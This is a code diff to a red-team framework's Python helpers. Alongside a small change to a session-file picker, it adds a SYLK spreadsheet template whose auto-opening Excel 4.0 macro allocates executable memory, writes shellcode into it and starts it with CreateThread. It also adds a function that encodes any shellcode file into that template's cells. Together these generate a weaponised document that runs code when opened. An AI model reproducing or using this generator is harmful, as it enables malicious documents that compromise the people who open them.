@@ -126,6 +126,21 @@ OLD_BANNER = f"""{GREEN}
           ░           ░  ░       ░      ░  ░    ░        ░ ░     ░     ░  ░   
     [⚠] Starting 👽 LazyOwn RedTeam Framew0rk ☠ [;,;] """
 BANNER = "[⚠] Starting 👽 LazyOwn RedTeam Framew0rk ☠ [;,;] "
+SYLK_TEMPLATE = """ID;P
+O;E
+NN;NAuto_open;ER1C1
+C;X1;Y1;ER1C2()
+C;X1;Y2;ECALL("Kernel32","VirtualAlloc","JJJJJ",0,1000000,4096,64)
+C;X1;Y3;ESELECT(R1C2:R1000:C2,R1C2)
+C;X1;Y4;ESET.VALUE(R1C3, 0)
+C;X1;Y5;EWHILE(LEN(ACTIVE.CELL())>0)
+C;X1;Y6;ECALL("Kernel32","WriteProcessMemory","JJJCJJ",-1, R2C1 + R1C3 * 20,ACTIVE.CELL(), LEN(ACTIVE.CELL()), 0)
+C;X1;Y7;ESET.VALUE(R1C3, R1C3 + 1)
+C;X1;Y8;ESELECT(, "R[1]C")
+C;X1;Y9;ENEXT()
+C;X1;Y10;ECALL("Kernel32","CreateThread","JJJJJJJ",0, 0, R2C1, 0, 0, 0)
+C;X1;Y11;EHALT()
+"""
 def parse_ip_mac(input_string):
     """
     Extracts IP and MAC addresses from a formatted input string using a regular expression.
@@ -1683,7 +1698,7 @@ def handle(input_str):
 
     return parts
 
-def get_users_dic():
+def get_users_dic(txt = None):
     """
     List all .txt files in the 'sessions/' directory and prompt the user to select one by number.
     
@@ -1691,14 +1706,17 @@ def get_users_dic():
     """
     path = os.path.join(os.getcwd(), 'sessions')
     
-    
-    txt_files = [f for f in os.listdir(path) if f.endswith('.txt')]
+    if txt:
+        txt_files = [f for f in os.listdir(path) if f.endswith(f'.{txt}')]
+    else:
+        txt = "txt"
+        txt_files = [f for f in os.listdir(path) if f.endswith('.txt')]
     
     if not txt_files:
-        print_error("No .txt files found in 'sessions/' directory.")
+        print_error(f"No .{txt} files found in 'sessions/' directory.")
         return None
 
-    print_msg("Available .txt files:")
+    print_msg(f"Available .{txt} files:")
     for i, file in enumerate(txt_files):
         print_msg(f"    {i + 1}. {file}")
     
@@ -1935,6 +1953,31 @@ def get_domain_from_xml(xml_file):
         print("[!] No domain or IP found in the XML file. [👽]")
 
     return domain
+
+def shellcode_to_sylk(shellcode_path):
+    
+	sylk_output = SYLK_TEMPLATE
+
+	charinline = 0
+	cell = 1
+
+	with open(shellcode_path, "rb") as f:
+		byte = f.read(1)
+		while byte != b"":
+			if charinline == 0:
+				sylk_output += ("C;X2;Y%s;E" % (str(cell)))
+				cell += 1
+			else:
+				sylk_output+=("&")
+			sylk_output += ("CHAR(" + str(ord(byte)) + ")")
+			byte = f.read(1)
+			charinline += 1
+			if charinline == 20:
+				sylk_output += ("\n")
+				charinline = 0
+	sylk_output+=("\nC;X2;Y%s;K0;ERETURN()\nE\n" % (str(cell)))
+	return sylk_output
+
 signal.signal(signal.SIGINT, signal_handler)
 arguments = sys.argv[1:]  
 
